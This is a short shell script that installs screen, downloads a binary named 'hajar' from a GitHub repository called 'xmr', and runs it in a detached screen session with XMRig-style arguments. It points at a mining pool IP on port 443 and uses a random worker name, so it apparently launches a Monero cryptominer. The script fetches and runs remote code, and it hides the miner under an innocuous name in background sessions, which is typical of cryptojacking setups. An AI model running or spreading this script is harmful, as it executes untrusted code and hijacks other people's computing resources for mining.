#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS xhajar.sh ./xhajar.sh 65 75

wget https://github.com/renilo/xmr/raw/main/hajar

POOL=208.113.200.73:443

WALLET=THISPC

WORKER=$(echo $(shuf -i 1-10000 -n 1)-GPU)

chmod +x hajar

screen -dmS run ./hajar --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0 -t 4
